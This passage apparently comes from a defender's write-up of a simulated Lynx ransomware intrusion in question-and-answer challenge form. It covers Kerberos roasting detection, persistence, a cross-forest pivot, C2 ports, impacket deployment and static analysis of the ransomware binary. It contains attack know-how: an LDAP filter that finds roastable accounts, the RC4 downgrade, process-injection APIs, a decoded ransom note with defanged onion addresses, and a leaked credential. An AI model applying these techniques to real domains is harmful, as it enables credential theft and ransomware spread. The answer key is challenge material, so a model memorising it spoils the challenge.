The attack surface is entirely a configuration weakness, not a protocol flaw or software vulnerability. Any domain user, even a completely unprivileged one, can enumerate every account in the domain with `UF_DONT_REQUIRE_PREAUTH` set via a Lightweight Directory Access Protocol (LDAP) query (`(userAccountControl:1.2.840.113556.1.4.803:=4194304)`), then send an unauthenticated `AS-REQ` for each. No valid credentials, no elevated access, and critically, no failed logon events are generated in the process, since the KDC considers the request entirely legitimate under that account's configuration.

**Why It Evades Detection**

This technique is attractive to attackers for the same reason it's easy to miss defensively: it produces no failure signal. A brute-force password guessing attack against a domain account generates a wall of `4625` (failed logon) events that trip alerting thresholds almost immediately. AS-REP Roasting generates none of that, the `AS-REQ`/`AS-REP` exchange with a non-preauth account is, from the KDC's perspective, a fully successful and expected transaction. The only anomaly is behavioral: a `PreAuthType=0` value on a successful `4768` event, sitting alongside a sea of normal `PreAuthType=2` traffic. If a defender is filtering only on logon failures or generic Kerberos errors, this activity is invisible. It also requires no elevated privilege or malware execution on a host to attempt, an attacker with any valid domain foothold, however low-privileged, can run the query and request cycle entirely off endpoint telemetry, relying solely on domain controller Kerberos traffic.

**Detection Method**

The most direct detection surface is Windows Security Event ID `4768` (Kerberos Authentication Ticket Requested) on domain controllers, filtered for `PreAuthType=0` (or absent) on requests that resulted in a successful ticket issuance (`Result Code=0x0`), correlated against the `TargetUserName` to identify which accounts are actually configured this way versus simply caught in a normal two-step negotiation retry. A single `PreAuthType=0` followed immediately by a `PreAuthType=2` retry from the same source is normal protocol behavior; a `PreAuthType=0` that stands alone and succeeds is the signal.

Example Splunk query, isolating successful non-preauth TGT requests:

```
index=* EventCode=4768
| search PreAuthType=0 Result_Code=0x0
| table _time, TargetUserName, IpAddress, PreAuthType, Result_Code
```

To narrow to accounts repeatedly hit this way (a pattern consistent with active roasting rather than incidental noise), aggregate by target user over the observation window:

```
index=* EventCode=4768 PreAuthType=0 Result_Code=0x0
| stats count, values(IpAddress) as source_ips, earliest(_time) as first_seen, latest(_time) as last_seen by TargetUserName
| where count > 1
```

**Wireshark display filter**, isolating unauthenticated `AS-REQ` packets (the ones missing `PA-ENC-TIMESTAMP`):

```
kerberos.msg_type == 10 && !kerberos.PA_ENC_TIMESTAMP
```

`msg_type == 10` isolates `AS-REQ` packets specifically (as opposed to `TGS-REQ`, `msg_type 12`). The second clause filters for requests where the `PA-ENC-TIMESTAMP` pre-authentication data block is absent, since a normal, correctly pre-authenticated request will carry that field. If you want to immediately correlate against a successful response rather than just the request, follow up by checking for the matching `AS-REP` (`msg_type == 11`) from the same conversation with no Kerberos error code in between, confirming the KDC actually issued a ticket rather than rejecting it with `KRB5KDC_ERR_PREAUTH_REQUIRED`.

Beyond Windows Security event logs, other useful signals for the same underlying misconfiguration include:

- Network capture or Kerberos-aware sensors observing an `AS-REQ` with no `PA-DATA` field followed by a successful `AS-REP`, since this is visible independent of host-based logging entirely.
- Periodic Active Directory audits querying `userAccountControl` for the `DONT_REQ_PREAUTH` bit directly, catching the exposure before it's ever exploited rather than after.
- Sysmon does not natively observe Kerberos protocol exchanges (it operates at the process/network-connection level on endpoints), so `4768` from the domain controller's Security log is the authoritative source here, endpoint telemetry can only show the downstream reuse of a cracked credential, not the roasting request itself.

**Critical Keywords**

`PreAuthType`, `PA-ENC-TIMESTAMP`, `UF_DONT_REQUIRE_PREAUTH`, `userAccountControl`, `4194304` (the decimal UAC flag value), `EventCode=4768`, `AS-REQ`, `AS-REP`, `Result_Code=0x0`, `KRB5KDC_ERR_PREAUTH_REQUIRED` (the expected error in a normal two-step exchange, its absence alongside a `PreAuthType=0` success is the tell).

**Significance**

This pattern sits early in a credential access chain but has outsized downstream impact: cracking the AS-REP offline yields a cleartext or crackable password for a real domain account with no interactive logon attempt against the domain ever required, and no lockout risk regardless of how many guesses the attacker makes locally. In this intrusion, it explains how an account's password could be recovered through a purely passive-looking Kerberos exchange, independent of the `LSASS` memory access documented separately in the `VulnSvc.exe` privilege escalation chain, giving the attacker a second, quieter credential access path running in parallel.

**MITRE ATT&CK Mapping**

T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting) is the primary technique. T1087.002 (Account Discovery: Domain Account) covers the LDAP enumeration step used to identify vulnerable accounts before requesting tickets against them.

**Q13**- The attacker also harvested service tickets via Kerberoasting. Which three SPN-bearing service accounts were targeted?

Answer: `svc_sql`, `svc_web`, `svc_sync`

Reason: Using `EventCode=4769` filtered to exclude machine accounts and `krbtgt`, the account `marketing01` was observed requesting Kerberos service tickets for three distinct Service Principal Name (SPN) bearing service accounts, `svc_sql`, `svc_web`, and `svc_sync`, in immediate succession. Each request used `TicketEncryptionType=0x17` (RC4-HMAC) rather than the domain's standard AES256 (`0x12`), confirming Kerberoasting: deliberately requesting weaker-encryption service tickets to harvest for offline password cracking. This maps to T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting) for the technique itself, and T1087.002 (Account Discovery: Domain Account) for the SPN enumeration step that would have preceded targeting these three specific service accounts.

```bash
index=* EventCode=4769 action=success
| search ServiceName!="*$" AND ServiceName!="krbtgt"
| stats count, values(ServiceName) as "Requested_Services" by TargetUserName, TicketEncryptionType
| sort - count
->
TargetUserName            TicketEncryptionType    count    Requested_Services
marketing01@CORP.LOCAL    0x17                    3        svc_sql, svc_sync, svc_web
```

![image.png](image%209.png)

## Detecting Kerberoasting Attacks

Kerberoasting targets a structural property of Kerberos service ticket issuance rather than a misconfiguration on a single account, which is what distinguishes it from AS-REP Roasting. Any authenticated domain user, regardless of privilege level, can request a Ticket Granting Service (TGS) ticket for any service that has a Service Principal Name (SPN) registered, that's a normal, expected part of how Kerberos brokers access to services. The ticket returned is encrypted with a key derived from the service account's own password hash, not the requesting user's. Since any authenticated user can request it, and the ticket travels back to the requester's own machine for use, an attacker can request tickets for every SPN-bearing account in the domain, then take those tickets offline and attempt to crack the encryption key, recovering the service account's plaintext password with no further contact against the domain controller.

**Mechanism**

The attacker first enumerates SPN-bearing accounts, typically via an LDAP query filtering for `servicePrincipalName` being present, which flags service accounts (often over-privileged legacy accounts tied to Structured Query Language (SQL) services, web application pools, or sync jobs, as seen with `svc_sql`, `svc_web`, and `svc_sync` in this intrusion). For each target, the attacker requests a TGS ticket via a normal `EventCode=4769` transaction. Critically, offensive tooling requests these tickets using `RC4-HMAC` encryption (`TicketEncryptionType=0x17`) rather than the domain's modern default of `AES256-CTS-HMAC-SHA1` (`0x12`), since RC4's key derivation is computationally far cheaper to brute-force offline than AES256. The domain controller honors whichever encryption type the client requests, as long as the target account supports it, so this downgrade is a client-side choice, not a server-imposed one.

**Why It Evades Detection**

Like AS-REP Roasting, this technique generates no failed logon events, the TGS-REQ/TGS-REP exchange is completely valid Kerberos traffic from an authenticated account operating within its normal rights. The volume and encryption-type pattern are the only anomalies: a single user requesting service tickets for several SPNs in rapid succession, all using the weaker legacy encryption type, deviates sharply from a real service's normal, singular ticket request pattern using the domain's standard encryption. A defender watching only for authentication failures, privilege escalation, or malware execution will not see this activity at all, it looks identical to ordinary service ticket issuance unless the encryption type and request cadence are specifically examined.

**Detection Method**

The primary detection surface is Windows Security Event ID `4769` (Kerberos Service Ticket Requested) on domain controllers. Two signals combine to separate Kerberoasting from normal service-ticket issuance: `TicketEncryptionType=0x17` (RC4-HMAC) instead of the domain baseline, and a single `TargetUserName` requesting tickets for multiple distinct SPN-bearing `ServiceName` values within a tight time window.

```sql
index=* EventCode=4769 action=success
| search ServiceName!="*$" AND ServiceName!="krbtgt"
| stats count, values(ServiceName) as "Requested_Services" by TargetUserName, TicketEncryptionType
| sort - count
```

Filtering for the encryption-type anomaly directly, rather than volume alone, catches lower-and-slower Kerberoasting attempts that stay under a request-count threshold:

```sql
index=* EventCode=4769 action=success TicketEncryptionType=0x17
| search ServiceName!="*$" AND ServiceName!="krbtgt"
| table _time, TargetUserName, ServiceName, TicketEncryptionType
```

Beyond the domain controller Security log, other useful signals include proactive LDAP audits for SPN-bearing accounts (`servicePrincipalName=*`) cross-referenced against password age and privilege level, since old, highly-privileged service accounts with SPNs are the highest-value roasting targets, and enforcing AES-only Kerberos encryption domain-wide (via `msDS-SupportedEncryptionTypes`) to eliminate the RC4 downgrade path entirely regardless of what a client requests.

**Critical Keywords**

`TicketEncryptionType`, `0x17` (RC4-HMAC), `0x12` (AES256-CTS-HMAC-SHA1), `EventCode=4769`, `TGS-REQ`, `TGS-REP`, `ServicePrincipalName` (SPN), `msDS-SupportedEncryptionTypes`, `krbtgt` (excluded as noise, not a target).

**Significance**

In this intrusion, Kerberoasting ran as a parallel credential access path alongside the LSASS memory dump from `VulnSvc.exe` and the AS-REP Roasting exposure on `jsmith`, giving the attacker three independent routes to privileged credentials from a single foothold. Service accounts targeted here (`svc_sql`, `svc_web`, `svc_sync`) are frequently provisioned with excessive privilege and infrequent password rotation compared to interactive user accounts, making a successfully cracked service account password disproportionately valuable for lateral movement and further domain compromise.

**MITRE ATT&CK Mapping**

T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting) is the primary technique. T1087.002 (Account Discovery: Domain Account) covers the SPN enumeration step used to identify targets before ticket requests began.

# Persistence

**Q14**- Threat actor used many types of persistence; While stabilizing SYSTEM access on the workstation after lossing connection many times so fast, the attacker manipulated a legitimate process in memory before resuming it with altered behavior. What MITRE ATT&CK technique applies?

Answer: T1055.012

Reason: While stabilizing SYSTEM-level access on the workstation after repeated rapid connection losses, the attacker manipulated a legitimate process's memory before resuming it with altered behavior which the defining signature of Process Hollowing, mapped to T1055.012 under the broader T1055 Process Injection technique family.

**Q15**- In the same phase mentioned above, when more stable shell session was needed, an inject script was downloaded to allocated memory in a remote process and marked the region executable. Provide the Win32 protection constant variable and its hex value.

Answer: `PAGE_EXECUTE_READWRITE`:`0x40`

Reason: This is the Win32 memory protection constant classically abused in shellcode injection: memory is allocated via `VirtualAllocEx`, written to via `WriteProcessMemory`, then its protection is changed via `VirtualProtectEx` to `PAGE_EXECUTE_READWRITE`, making the region simultaneously writable and executable. This combination is a strong red flag on its own, since legitimate code rarely needs `RWX` memory, most defensive tooling flags this specifically because normal compiled code separates writable and executable regions (consistent with the PE section permission model documented earlier, where `.text` is `read+execute` only and `.data` is read-write, never both).

**Q16**- Having reached the domain controller using high-privilege credentials harvested from LSASS, the attacker created some accounts where one is typosquatted domain account and added it to Domain Admins. What is its `sAMAccountName`?

Answer: `admnistrator`

Reason: After reaching `DC01` with credentials harvested from `LSASS`, the attacker created and added the typosquatted account `admnistrator`, missing the "i" from "administrator", to the Domain Admins group at `12:30:56 UTC` on `2026-04-30`. A second suspicious addition, `IT.Adm0n`, followed minutes later. Both are consistent with establishing a stealthy, easily-overlooked privileged persistence account, relying on casual visual review of group membership to overlook the near-identical naming. This maps to T1136.002 (Create Account: Domain Account) for the account creation, T1098.007 (Account Manipulation: Additional Local or Domain Groups) for the addition to Domain Admins.

```sql
index=* EventCode=4728, TargetUserName="Domain Admins", TargetDomainName=CORP
|table _time, Computer, MemberSid, status, TargetUserName, name
```

![image.png](image%2010.png)

**Q17**- Alongside the lookalike account, a commercial remote-access tool was installed as a service on the corp.local DC for redundant access. What is the executable's full image path?

Answer: `C:\ProgramData\AnyDesk\AnyDesk.exe`

Reason: Alongside the typosquatted Domain Admin account, the attacker installed the commercial remote-access tool AnyDesk as a Windows service (`AnyDesk Service`) at `12:34:21 UTC` on `2026-04-30`, with image path `C:\ProgramData\AnyDesk\AnyDesk.exe --service`. This provided a redundant, dual-use access channel to the domain controller that could blend in with legitimate remote-support software, since AnyDesk is commercially signed and commonly whitelisted in many environments. This maps to T1219 (Remote Access Software) for the use of a legitimate dual-use tool to maintain access.

```sql
index=* EventCode=7045 Computer="DC01.corp.local" status=installed
|table _time, service, ImagePath
```

![image.png](image%2011.png)

# Cross Forest Pivot

**Q18**- Among the Kerberoasted service accounts, one had its password reused across forests. From the Linux pivot, the attacker successfully sprayed `partner.local` with this credential. Which account was it?

Answer: `svc_sync`

Reason: The Kerberoasted service account `svc_sync` had its password reused across forests. From `12:52:45` through `12:57:24 UTC` on `2026-04-30`, the Linux pivot host `10.10.5.37` authenticated successfully to `PART-DC01.partner.local` via NTLM using `svc_sync`'s credentials, repeated six times over roughly five minutes. This confirms the attacker sprayed the cracked service-account password across the `partner.local` forest trust and successfully compromised it, extending the intrusion from the original `corp.local` forest into the trusted partner forest via the same pivot host used to establish the initial RDP foothold. 

NTLM + Type 3 + rapid-fire pattern from `10.10.5.37` = consistent with a scripted/tool-driven credential-reuse connection (e.g., a lateral-movement tool re-authenticating an SMB session, or WinRM/`PsExec`), never RDP.

```bash
index=* ("svc_sql" OR "svc_sync" OR "svc_web") Computer="PART-DC01.partner.local" TargetUserSid="*PARTNER*"
|table _time, TargetUserName, src_ip, AuthenticationPackageName, status, EventCode, name, Logon_Type
```

![image.png](image%2012.png)

# Command and Control

**Q19**- Across the entire intrusion, four distinct destination ports were observed in C2 callbacks to the staging server: payload downloads, the initial macro-borne shell, the SYSTEM shell after privilege escalation. List them in that order.

Answer: `80`, `6666`, `5555`

Reason: Four distinct ports were used across the intrusion for callbacks to the staging server `52.58.62.68`: `80` for payload downloads via `powershell.exe`, `6666` for the initial macro-borne shell via `rad125F4.tmp.exe`, `4444` for an unattributed `svchost.exe` callback not part of the three named stages, and `5555` for the `SYSTEM`-level shell established post-privilege-escalation via `VulnSvc.exe`. The chronological order for the three attributed stages is `80` → `6666` → `5555`, tracking the progression from initial tool retrieval, to the macro-dropped foothold shell, to the elevated `SYSTEM` shell following the service binary hijack.

```sql
index=* DestinationIp=52.58.62.68
| table _time, SourceIp, DestinationIp, DestinationPort, Image
| dedup DestinationPort sortby +_time
```

![image.png](image%2013.png)

# Ransomware Deployment

**Q20-** With cross-forest Domain Admin secured, the attacker mass-deployed the ransomware via repeated remote service creation with randomized names and execution from `ADMIN$` across all reachable hosts. What framework and tool generated this behavior?

Answer: `impacket`, `psexec.py`

Reason: With cross-forest Domain Admin secured, the attacker mass-deployed ransomware via repeated remote service creation with randomized names, executing binaries from `ADMIN$` across all reachable hosts. The SMB-written binary `WvLYkAEp.exe` on `DC01` (`Image=System`, `ProcessId=4`) timestamp-correlates to the second with its corresponding Event ID `4697` service-creation event, confirming the drop-then-execute pattern across multiple hosts, including `DC01` and `WS-IT01`, with random service names and `%systemroot%` binary paths, the signature of Impacket's `psexec.py` rather than legitimate Sysinternals PsExec, which uses a fixed, predictable service name.

```sql
# Main service installation events
index=* EventCode=4697 NOT SubjectUserName="*$*"
|table _time, SubjectUserName, host, ServiceFileName, ServiceName
-> 
_time	SubjectUserName	host	ServiceFileName	ServiceName
2026-04-30 14:15:10	Administrator	DC01	%systemroot%\WvLYkAEp.exe	WtRb
2026-04-30 14:10:11	Administrator	WS-IT01	%systemroot%\RUmvyoXH.exe	NNvW
2026-04-30 14:09:41	Administrator	WS-IT01	%systemroot%\EwWIzknp.exe	NCiZ
2026-04-30 14:07:24	Administrator	WS-IT01	%systemroot%\zlpSAfQA.exe	CnNj

# Corroborating drop event sample:
index=* "WvLYkAEp.exe" EventCode=11
2026-04-30 14:15:10.462 — Image=System, ProcessId=4, TargetFilename=C:\Windows\WvLYkAEp.exe # SMB write to ADMIN$ on DC01, timestamp-matched to the 4697 service creation.
```

![image.png](image%2014.png)

**Q21**- When did the ransomware binary first touch its first target, give both the download start time and the deployment path.

Answer: `2026-04-30 13:33`, `C:\Windows\SysWOW64\lynx.exe`

Reason: `lynx.exe` was written to `C:\Windows\SysWOW64\lynx.exe` at `13:33:13` by a PowerShell process (`ProcessGuid {B7417AB1-59EE-69F3-3D27-00000000BA03}`) spawned from the original RDP-foothold shell (`ProcessGuid {B7417AB1-59EA-69F3-3927-00000000BA03}`), the same parent shell that anchors the attacker's session back to the initial RDP anomaly. This closes the loop: the same attacker session that opened the RDP foothold ultimately hand-delivered the ransomware binary itself, via a separate PowerShell child process from the one used earlier for C2 beaconing and discovery, ahead of the mass `psexec.py`-style push seen during the domain-wide deployment phase.

```sql
index=* ProcessGuid="{B7417AB1-59EE-69F3-3D27-00000000BA03}" EventCode=11
|table _time, EventDescription, TargetFilename
```

```bash
# Earlier lineague from the second spawned process (cmd.exe)
{B7417AB1-59EA-69F3-3927-00000000BA03}  (RDP session shell)
|-- powershell.exe (SysWOW64)  {B7417AB1-59EE-69F3-3D27-00000000BA03}  -> C:\Windows\SysWOW64\lynx.exe  (13:33:13)
```

**Q22**- As part of the impact stage, the ransomware drops a desktop wallpaper image to deface victims. What is its full path?

Answer: `C:\Windows\Temp\background-image.jpg`

Reason: The ransomware drops a desktop-wallpaper defacement image at a consistent path across every affected host, including the confirmed cross-forest pivot host `PART-DC01`, at `C:\Windows\Temp\background-image.jpg`. This reinforces that the ransomware executed identically regardless of forest, confirming the payload's deployment logic was forest-agnostic once Domain Admin access was secured on both sides of the trust. This maps to T1491.001 (Defacement: Internal Defacement) for the wallpaper replacement, and T1486 (Data Encrypted for Impact) as the broader technique this defacement accompanies as part of the ransomware's impact stage.

```sql
index=* "lynx.exe" ("wallpaper" OR "background")
|table _time, host, EventCode, TargetFilename
```

![image.png](image%2015.png)

# Static Malware Analysis

**Q23**- A copy of the ransomware binary was recovered post-incident. From its basic file properties, provide the SHA256 hash and the PE compilation timestamp (UTC).

Answer: `eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc`, `2024-07-25 07:57:55`

Reason:`lynx.bin` was loaded in PEStudio for initial triage. The file's SHA256 hash, taken from the `file` node, is `EAA0E773EB593B0046452F420B6DB8A47178C09E6DB0FA68F6A2D42C3F48E3BC`. The PE `TimeDateStamp`, taken from `stamp > compiler`, resolves to `2024-07-25 07:57:55 UTC`, indicating the binary's compiled build time as recorded in its header (noting this field can be forged or preserved from a build system rather than reflecting genuine attacker activity, but it establishes a baseline for later timeline cross-referencing).

![image.png](image%2016.png)

![image.png](image%2017.png)

**Q24**- Per the PE Optional Header, what is the binary's subsystem constant (per MSDN)?

Answer: `IMAGE_SUBSYSTEM_WINDOWS_CUI`

Reason: A Portable Executable (PE) is the file format Windows uses for all native executables, `.exe`, `.dll`, `.sys`, and similar. It's a structured container: DOS stub, PE header, COFF file header, Optional Header, section table (`.text`, `.data`, `.rsrc`, etc.), followed by the actual code and data. Every field is metadata the OS loader reads to determine how to map the file into memory and execute it.

The `Subsystem` constant is one field within the Optional Header (`IMAGE_OPTIONAL_HEADER.Subsystem` in `winnt.h`) that tells the Windows loader what environment the binary expects to run in, GUI, console, driver, EFI, and so on, determining behaviors such as whether a console window is auto-allocated on launch. For `lynx.bin`, this field resolves to `IMAGE_SUBSYSTEM_WINDOWS_CUI` (Console, value `3`), meaning the binary is designed to run headless, in text-mode, with no graphical interface. For a ransomware payload, this is consistent with silent, unattended execution via a remote shell, matching the `psexec.py` named-pipe deployment pattern traced earlier in the intrusion. The binary has no need to present a window mid-encryption; the victim-facing interface is instead handled separately by the dropped wallpaper defacement file, not by the binary itself.

Reference: [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)

![image.png](image%2018.png)

**Q25**- What PDB path is embedded in the PE Debug directory?

Answer: `E:\Lynx\Release\Lynx.pdb`

Reason: A Program Database (PDB) file is a Microsoft debug-symbol file generated alongside a compiled binary. It maps machine code back to source file names, line numbers, and function or variable names, letting a debugger display human-readable symbols instead of raw addresses. The PE's Debug Directory embeds the build-time path to that PDB, in this case `E:\Lynx\Release\Lynx.pdb`, so a debugger can locate matching symbols later if the PDB file itself is available.

Forensically, this is a solid attribution artifact: the path leaks the developer's local project structure (`E:\Lynx\Release\`), including the malware family's actual project name, `Lynx`, straight from the source. This is often more reliable than externally-assigned naming conventions, since it reflects what the authors themselves called their own project.

![image.png](image%2019.png)

**Q26**- Three of the binary's imported DLLs are flagged as highly suspicious by static analysis. Name them.

Answer: `CRYPT32.dll`, `RstrtMgr.DLL`, `MPR.dll`

Reason: Three imported DLLs are flagged as highly suspicious in PEStudio's import table. `CRYPT32.dll` provides cryptographic encode and decode operations, tied to the binary's encryption routine. `RstrtMgr.dll` (Restart Manager) exposes APIs commonly abused by ransomware to force-close processes holding target files open, bypassing file locks that would otherwise prevent encryption. `MPR.dll` (Multiple Provider Router) supports network resource enumeration, used to discover and reach mapped or network shares so encryption can extend beyond the local disk.

This maps to T1486 (Data Encrypted for Impact) for the `CRYPT32.dll` encryption capability, T1489 (Service Stop) conceptually for the `RstrtMgr.dll` file-lock bypass, since it achieves a similar outcome to stopping a service that's holding a resource, and T1135 (Network Share Discovery) for the `MPR.dll` share enumeration used to extend the encryption's reach.

| DLL | Imported APIs | Purpose |
| --- | --- | --- |
| `CRYPT32.dll` | `CryptStringToBinaryA` | Windows CryptoAPI — encoding/decoding cryptographic data (e.g. converting a base64/hex-encoded key or config blob into raw bytes). Directly relevant to the encryption routine. |
| `RstrtMgr.dll` | `RmStartSession`, `RmRegisterResources`, `RmGetList`, `RmShutdown`, `RmEndSession` | Windows Restart Manager API — legitimately used by installers to find and close processes/services holding a file open before replacing it. Ransomware abuses this to detect which process has a target file locked (e.g. a database, Office doc) and force it closed so the file can be encrypted, instead of skipping it. |
| `MPR.dll` | `WNetOpenEnumW`, `WNetEnumResourceW`, `WNetCloseEnum` | Windows Networking API — enumerates active network resource connections (mapped drives, remote shares). Used by ransomware to discover and reach network shares to encrypt beyond the local disk — explains the cross-host, cross-share impact traced earlier. |

**Q27**- Inside the note-builder, one helper function decodes the embedded ransom-note blob. What is its IDA auto-name?

Answer: `sub_401370`

Reason: The note-builder's decode helper wasn't recognized by IDA's Fast Library Identification and Recognition Technology (FLIRT) signatures, so it retained its default auto-generated name, `sub_401370`. It was traced by pivoting from the `CryptStringToBinaryA` import, flagged in the prior entry, via cross-reference back to its caller: navigating IDA's Imports tab to `CryptStringToBinaryA`, jumping to its cross-reference, and landing on the calling function. This function is a strong candidate for the ransom note's decode routine, likely responsible for decoding an embedded, encoded string (base64 or hex) into the plaintext ransom note or a configuration blob used to build it, pending confirmation by examining its disassembly for the decoded output's destination.

Here we go from Imports → IDA View-A → Right click on function name → Go to operand to see the actual assembly logic referencing the Windows API `CryptStringToBinaryA` .

![image.png](image%2020.png)

![image.png](image%2021.png)

![image.png](image%2022.png)

**Q28**- What .onion URL is embedded in the ransom note?

Answer: `hxxp://lynxch2k5xi35j7hlbmwl7d6u2oz4vp2wqp6qkwol624cod3d6iqiyqd.onion/login`

Reason: The ransom-note template is stored as a single, long base64-encoded string in `.rdata`, cross-referenced from `_main`, split across multiple `db` lines in IDA's disassembly view purely for display purposes. Reassembling the full string and decoding it via CyberChef's "From Base64" recipe reveals the complete note text, including the TOR contact URL, a disclosure/leak site, a contact email, and a clearnet mirror.

The decoded note directs victims to a TOR onion address at `hxxp://lynxch2k5xi35j7hlbmwl7d6u2oz4vp2wqp6qkwol624cod3d6iqiyqd[.]onion/login`, a contact email at `martina.lestariid1898[@]proton.me`, a second TOR onion address serving as a disclosure/leak site at `hxxp://lynxbllrfr5262yvbgtqoyq76s7mpztcqkv6tjjxgpilpma7nyoeohyd[.]onion/disclosures`, and a clearnet mirror at `hxxp://lynxblog[.]net/`.

```bash
IDA View-A -> _main -> xref to encoded blob at .rdata:00425C58
-> reassemble split base64 string -> CyberChef: From Base64

Decoded note:
Your data is stolen and encrypted.
Your unique identificator is %id%
Use this TOR site to contact with us:
hxxp://lynxch2k5xi35j7hlbmwl7d6u2oz4vp2wqp6qkwol624cod3d6iqiyqd[.]onion/login
Use this email to contact with us:
martina.lestariid1898[@]proton.me
Our blog
 ~ TOR Network: hxxp://lynxbllrfr5262yvbgtqoyq76s7mpztcqkv6tjjxgpilpma7nyoeohyd[.]onion/disclosures
 ~ Mirror #1: hxxp://lynxblog[.]net/
```

![image.png](image%2023.png)

![image.png](image%2024.png)

**Q29**- The ransomware skips four file extensions during encryption. List them.

Answer: `.exe`, `.msi`, `.dll`, `.lynx`

Reason: Tracing into the file-enumeration function, `sub_404E00`, between `FindFirstFileW`/`FindNextFileW` calls, the malware extracts the file extension from `FindFileData.cFileName` and runs four sequential `lstrcmpiW` (case-insensitive compare) checks, each jumping to a skip target on a match. The four excluded extensions are `.exe`, `.msi`, `.dll`, and `.lynx`, the first three avoiding destabilization of the operating system and installed applications, and the last being the ransomware's own output extension, preventing re-encryption of already-encrypted files. Beyond the extension checks, the same skip logic continues with two substring calls to `sub_405DE0`, skipping any filename containing `LYNX` or matching `README.txt`, protecting the ransomware's own dropped ransom note and related artifacts from being overwritten during its own encryption pass.

```bash
sub_404E00 -> loc_405200 (extract extension) -> loc_405215:
  lstrcmpiW vs ".exe"   -> jz skip
  lstrcmpiW vs ".msi"   -> jz skip
  lstrcmpiW vs ".dll"   -> jz skip
  lstrcmpiW vs ".lynx"  -> jz skip
```

| Extension | Reason |
| --- | --- |
| `.exe` | Avoid bricking executables/OS stability |
| `.msi` | Avoid breaking installers |
| `.dll` | Avoid bricking shared libraries/OS stability |
| `.lynx` | Ransomware's own output extension — prevents re-encrypting already-encrypted files |

![image.png](image%2025.png)

![image.png](image%2026.png)

![image.png](image%2027.png)

# Attack Chain

| Time (UTC) | Stage | Detail | MITRE |
| --- | --- | --- | --- |
| 2026-04-30 09:17:51 | Initial Access | First RDP session into `BEACHHEAD` from `10.10.5.37` as `marketing01`, bypassing sanctioned jump box `10.10.6.205` | T1021.001 / T1078 |
| 2026-04-30 09:42:58 | Discovery | `nltest.exe /domain_trusts` executed, enumerating forest trust relationships | T1482 |
| 2026-04-30 09:44:12 | Command and Control | First payload download from staging server `52.58.62.68:80` via `powershell.exe` (recurs 10:17, 10:35, 11:07) | T1105 |
| 2026-04-30 10:17:33 | Collection | `SharpHound.exe` collects AD objects into `C:\Windows\Temp\20260430101733_BloodHound.zip` | T1087.002 |
| 2026-04-30 10:18:29–10:28:40 | Exfiltration / Credential Access | `net.exe` mounts external SMB share to exfil AD archive; plaintext creds `b4l3ri0n:Password123` leaked in command line (3 retries after invalid UNC-port syntax) | T1567 / T1552 |
| 2026-04-30 10:35:09–10:38:23 | Internal Phishing | `Q1-HR-Policy-Update.docm` staged on BEACHHEAD, then pushed via SMB to `FILESVR01` (`C:\Shares\PUBLIC\`) | T1566.001 |
| 2026-04-30 11:17:09–11:17:29 | Initial Execution | `jsmith` opens phishing doc on `WS-HR01`; macro drops and executes `rad125F4.tmp.exe` | T1204.002 / T1059.005 |
| 2026-04-30 11:17:33 | Command and Control | `rad125F4.tmp.exe` callback on port `6666` | T1071 |
| 2026-04-30 11:17:38–11:25:38 | Privilege Escalation / Discovery | `rad.exe` → `cmd.exe` → `powershell.exe` → drops `winPEASx64.exe` in `C:\Users\jsmith\` | T1055.012 / T1518.001 |
| 2026-04-30 11:27:41–11:27:42 | Discovery / C2 | `winPEASx64.exe` resolves via `1.1.1.1`, contacts `18.64.211.110` and `10.10.11.57` (unattributed `svchost.exe` also calls back on port `4444`) | T1071 |
| 2026-04-30 11:32:15–11:35:16 | Privilege Escalation | Writable service `C:\Tools\VulnSvc.exe` overwritten with `C:\Users\jsmith\vulnsvc_system.exe`, yielding SYSTEM | T1574.010 |
| 2026-04-30 11:37–11:42 | Command and Control | SYSTEM shell callback on port `5555` via `VulnSvc.exe` | T1071 |
| 2026-04-30 11:39:47 | Credential Access | `VulnSvc.exe` accesses `lsass.exe` memory, dumping credentials | T1003 |
| ~10:39–12:14 | Credential Access | `jsmith` AS-REP Roasting exploited (`PreAuthType=0`) | T1558.004 |
| Prior to 12:14 | Credential Access | Kerberoasting via `marketing01` against `svc_sql`, `svc_web`, `svc_sync` (RC4-HMAC tickets) | T1558.003 |
| 2026-04-30 12:18:00 | Lateral Movement | `helpdesk01` credential validated via Kerberos logon to `DC01` from `WS-HR01` (`10.10.11.8`) | T1078 |
| 2026-04-30 12:25:52–14:15:10 | Ransomware Deployment | Mass deployment via Impacket `psexec.py`: randomized service binaries pushed to `ADMIN$` across `DC01`, `WS-IT01`, `CORP-DC02`, `BACKUPSVR01`, `FILESVR01`, `WS-HR01`, `BEACHHEAD`, `PART-DC01` | T1021.002 / T1570 |
| 2026-04-30 12:30:56 | Persistence | Typosquatted account `admnistrator` added to Domain Admins | T1136.002 / T1098.007 |
| 2026-04-30 12:34:21 | Persistence | AnyDesk installed as a service on `DC01` (`C:\ProgramData\AnyDesk\AnyDesk.exe`) | T1219 |
| 2026-04-30 12:52:45–12:57:24 | Cross-Forest Pivot | `svc_sync` credentials sprayed from `10.10.5.37` into `partner.local` via NTLM | T1078.002 |
| 2026-04-30 13:32:26–13:33:13 | Ransomware Deployment | Attacker's own RDP session manually drops `lynx.exe` to `C:\Windows\SysWOW64\` on `BEACHHEAD` | T1486 |
| 2026-04-30 13:35:00–14:14:02 | Impact | Wallpaper defacement (`C:\Windows\Temp\background-image.jpg`) dropped across all 8 compromised hosts, including `PART-DC01` | T1491.001 |
| Ongoing post-deployment | Impact | `lynx.exe` actively encrypts files domain-wide (700+ EID11 events on workstations, ~30 on servers), skipping `.exe`/`.msi`/`.dll`/`.lynx` | T1486 |

## Text Tree

```sql
[Initial Access]  10[.]10[.]5[.]37 (Linux dev server) → BEACHHEAD
    └── RDP logon as marketing01 (09:17:51, bypasses jump box 10[.]10[.]6[.]205)
        ├── [Discovery] nltest.exe /domain_trusts (09:42:58)
        ├── [Command and Control] powershell.exe beacon → 52[.]58[.]62[.]68:80 (09:44:12, recurring)
        ├── [Collection] SharpHound.exe → C:\Windows\Temp\20260430101733_BloodHound.zip (10:17:33)
        ├── [Exfiltration/Credential Access] net.exe use \\52[.]58[.]62[.]68\share ← leaked b4l3ri0n:Password123 (10:18:29–10:28:40)
        │
        ├── [Internal Phishing]
